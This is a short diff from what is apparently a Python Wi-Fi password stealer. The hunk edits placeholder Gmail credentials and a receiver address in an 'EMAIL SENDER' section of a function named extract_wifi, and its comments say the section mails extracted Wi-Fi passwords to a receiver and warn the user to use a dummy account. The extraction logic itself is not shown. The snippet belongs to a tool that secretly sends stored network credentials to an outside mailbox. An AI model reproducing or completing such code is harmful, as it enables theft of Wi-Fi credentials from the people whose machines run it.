@@ -58,10 +58,10 @@ def extract_wifi():
 
     ################################# EMAIL SENDER #########################################################
 
-    my_gmail = "YOUR EMAIL ADDRESS" # this email address will be used to send wifi passwords
-    my_pswd = "YOUR EMAIL PASSWORD" # WARNING: DON'T USE YOUR MAIN EMAIL USE A DUMMY EMAIL INSTEAD
+    my_gmail = "YourEmailAddress@gmail.com" # this email address will be used to send wifi passwords
+    my_pswd = "YourEmailPassword" # WARNING: DON'T USE YOUR MAIN EMAIL USE A DUMMY EMAIL INSTEAD
 
-    reciever = "RECIEVER EMAIL ADDRESS" # this email will recieve the extracted wifi password
+    reciever = "RecieverEmailAddress@gmail.com" # this email will recieve the extracted wifi password
 
     smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
     smtp_server.ehlo()
